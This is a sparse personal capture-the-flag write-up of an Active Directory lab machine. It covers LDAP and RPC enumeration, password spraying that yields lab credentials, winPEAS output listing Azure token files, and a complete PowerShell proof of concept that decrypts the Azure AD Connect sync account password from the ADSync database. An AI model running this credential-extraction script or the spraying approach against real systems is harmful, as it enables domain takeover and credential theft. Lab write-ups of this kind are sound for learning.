# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/yAADhUv.png)
![](https://i.imgur.com/jFz73qJ.png)
- The ldap Works
	- ![](https://i.imgur.com/Qlqzh5E.png)

- The RPC works too
	- ![](https://i.imgur.com/1yjW1Si.png)
![](https://i.imgur.com/Y5EmK4b.png)
### Gaining Access
- i dd all the enumeartion but i got only password spraing, When i try with some 100+ wordlist it was not working. so i tried to do with same username and password list.
![](https://i.imgur.com/YssGy2R.png)
- ` SABatchJobs : SABatchJobs `
## Internal
### Enumeration
![](https://i.imgur.com/pyH9mPm.png)
- ` mhope : 4n0therD4y@n0th3r$ `
- ![](https://i.imgur.com/ckwIxti.png)
- ![](https://i.imgur.com/Vq1HJqK.png)
![](https://i.imgur.com/6l5hfJu.png)
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\mhope\.azure\TokenCache.dat (Azure Token Cache)
    Accessed:1/3/2020 5:36:14 AM -- Size:7896

    C:\Users\mhope\.azure\AzureRMContext.json (Azure RM Context)
    Accessed:1/3/2020 5:35:57 AM -- Size:2794
```
### Gaining Access
![](https://i.imgur.com/bLfSqH9.png)
[[911. 🎯Active Directory Enumeration & Attacks]] - Azure AD Attack
```powershell
Function Get-ADConnectPassword{
	Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
	$key_id = 1
	$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
	$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
	
	$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList 	"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
	$client.Open()
	$cmd = $client.CreateCommand()
	$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
	$reader = $cmd.ExecuteReader()
	$reader.Read() | Out-Null
	$config = $reader.GetString(0)
	$crypted = $reader.GetString(1)
	$reader.Close()
	
	add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
	$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
	$km.LoadKeySet($entropy, $instance_id, $key_id)
	$key = $null
	$km.GetActiveCredentialKey([ref]$key)
	$key2 = $null
	$km.GetKey(1, [ref]$key2)
	$decrypted = $null
	$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
	$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
	$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
	$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
	
	Write-Host ("Domain: " + $domain.Domain)
	Write-Host ("Username: " + $username.Username)
	Write-Host ("Password: " + $password.Password)
}
```
![](https://i.imgur.com/vVGoQQq.png)

### Maintaining Access


# Random Notes